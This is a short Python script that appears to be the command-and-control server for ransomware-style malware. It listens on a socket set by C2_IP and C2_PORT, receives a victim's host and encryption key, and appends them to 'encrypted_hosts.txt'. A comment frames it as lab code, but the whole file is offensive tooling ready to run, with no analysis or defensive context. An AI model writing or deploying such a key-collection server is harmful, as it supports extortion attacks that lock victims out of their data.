import socket
import os

# ---------------------------------------------------------
# Configuration — set these via environment variables or
# edit this file before running in your own lab environment.
# ---------------------------------------------------------


IP_ADDRESS = os.environ.get('C2_IP', '127.0.0.1')   # <-- set your server IP here
PORT      = int(os.environ.get('C2_PORT', '5678'))   # <-- set your server port here

print('Creating socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print(f'Listening for connections...')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')
            break
        print('Connection completed and closed!')